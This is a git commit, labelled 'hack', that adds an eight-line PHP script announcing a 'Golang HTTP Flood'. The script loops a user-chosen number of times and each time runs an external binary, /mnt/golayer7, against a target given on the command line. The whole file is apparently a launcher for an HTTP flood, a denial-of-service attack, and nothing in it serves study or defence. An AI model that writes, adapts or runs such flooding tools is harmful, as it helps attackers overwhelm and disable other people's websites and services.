547f28d4d6acdcc01d1dfd0c452fb5f38ed34d98
chaiya1239900 <52321420+chaiya1239900@users.noreply.github.com>
2019-07-24 00:53:56 +0700

    hack

---
+++ t.php
@@ -0,0 +1,8 @@
+<?php
+echo "Flooding start\n";
+echo "Golang HTTP Flood + Loop PHP BY ! ERROR 5X7d3x13#9385\n";
+
+for ($x = 0; $x <= $argv[4]; $x++) {
+	exec('/mnt/golayer7 '.$argv[1].' '.$argv[2].' '.$argv[3].' 2');
+}
+?>
